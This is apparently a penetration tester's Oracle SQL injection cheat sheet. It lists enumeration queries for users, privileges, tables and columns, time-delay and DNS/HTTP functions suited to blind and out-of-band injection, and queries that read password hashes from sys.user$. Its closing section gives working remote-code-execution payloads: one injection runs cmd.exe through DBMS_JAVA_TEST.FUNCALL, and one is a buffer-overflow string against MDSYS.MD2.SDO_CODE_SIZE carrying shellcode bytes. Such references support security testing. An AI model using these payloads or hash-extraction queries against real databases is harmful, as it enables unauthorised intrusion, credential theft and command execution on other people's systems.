# Oracle

## Database commands

### Comments

```
SELECT 1 FROM dual -- comment
```

SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.

### Version

```
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;
```

### Users

```
SELECT user FROM dual;
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$;
```

### Privileges

```
SELECT * FROM session_privs; 
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
```

### Database info

```
SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;
SELECT DISTINCT owner FROM all_tables;
SELECT name FROM V$DATAFILE;	
```

#### Default tables

```
SYSTEM
SYSAUX
```

### List tables

```
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
```

### List columns

```
SELECT column_name FROM all_tab_columns WHERE table_name = '<name>';
SELECT column_name FROM all_tab_columns WHERE table_name = '<name>' and owner = '<name>';
```

### Filter table by column name

```
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%<name>%';
```

### Access nth row

```
SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=<nth>;
```

### String operations

```
SELECT substr('abcd', <nth>, 1) FROM dual; -- gets 3rd character, 'c'
SELECT bitand(6,2) FROM dual;
SELECT chr(65) FROM dual;    -- get 'A'
SELECT ascii('A') FROM dual; -- get 65
SELECT CAST(1 AS char) FROM dual;
SELECT CAST('1' AS int) FROM dual;
SELECT chr(65) || chr(66) FROM dual; -- returns AB
SELECT 'A' || 'B' FROM dual;         -- returns AB
```

### Conditional execution

```
BEGIN IF 1=1 THEN <func1>; ELSE <func2>; END IF; END;
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; --returns 1	
```

### Time delay

```
BEGIN DBMS_LOCK.SLEEP(<seconds>); END;
```

### DNS and HTTP

```
SELECT UTL_INADDR.get_host_name('<ip>') FROM dual
SELECT UTL_INADDR.get_host_address('<url>') FROM dual;
SELECT UTL_HTTP.REQUEST('<url>') FROM dual;
```

## Passwords

```
SELECT name, password, astatus FROM sys.user$; <= 10g.  astatus tells you if acct is locked
SELECT name,spare4 FROM sys.user$ — priv, 11g
```

**Format:** DES-based

## Vulnerabilities

### RCE

#### via function call

```
AND (Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','C:\\windows\\system32\\cmd.exe','/C','<command>') FROM DUAL) IS NULL --
```

#### via buffer overflow

```
'||TO_CHAR(MDSYS.MD2.SDO_CODE_SIZE('AAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'||CHR(131)||CHR(195)||CHR(9)||CHR(255)||CHR(227)||CHR(251)||CHR(90)||CHR(227)||CHR(120)||CHR(54)||CHR(141)||CHR(67)||CHR(19)||CHR(80)||chr(184)||chr(191)||chr(142)||chr(01)||chr(120)||chr(255)||chr(208)||chr(184)||chr(147)||chr(131)||chr(00)||chr(120)||chr(255)||chr(208)||'<command>'))--
```

